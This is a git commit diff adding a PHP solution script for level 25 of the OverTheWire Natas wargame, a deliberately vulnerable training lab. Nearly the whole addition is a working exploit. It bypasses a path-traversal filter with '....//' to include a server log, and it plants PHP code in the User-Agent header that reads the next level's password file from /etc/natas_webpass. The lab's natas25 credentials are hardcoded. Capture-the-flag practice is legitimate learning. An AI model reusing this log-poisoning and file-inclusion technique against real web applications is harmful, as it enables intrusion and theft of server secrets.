5c8722d4acdad6bd46ec419f801a61584ba7d5e4
indeedhat <iam4423@gmail.com>
2019-09-16 23:02:46 +0100

    Update 25.php

--- natas/25.php
+++ natas/25.php
@@ -2,3 +2,18 @@
 
 $user = 'natas25';
 $pass = 'GHF6X7YwACaYYssHVY05cFq83hRktl4c';
+$trick = '....//logs/natas25_indeedhat.log';
+$ch = curl_init("http://natas25.natas.labs.overthewire.org?lang=$trick");
+
+curl_setopt_array(
+    $ch,
+    [
+        CURLOPT_RETURNTRANSFER => 1,
+        CURLOPT_COOKIE => 'PHPSESSID=indeedhat',
+        CURLOPT_USERAGENT => '<?=file_get_contents("/etc/natas_webpass/natas26")?>',
+        CURLOPT_USERPWD => "$user:$pass",
+        CURLOPT_HTTPAUTH => CURLAUTH_BASIC
+    ]
+);
+
+print curl_exec($ch);
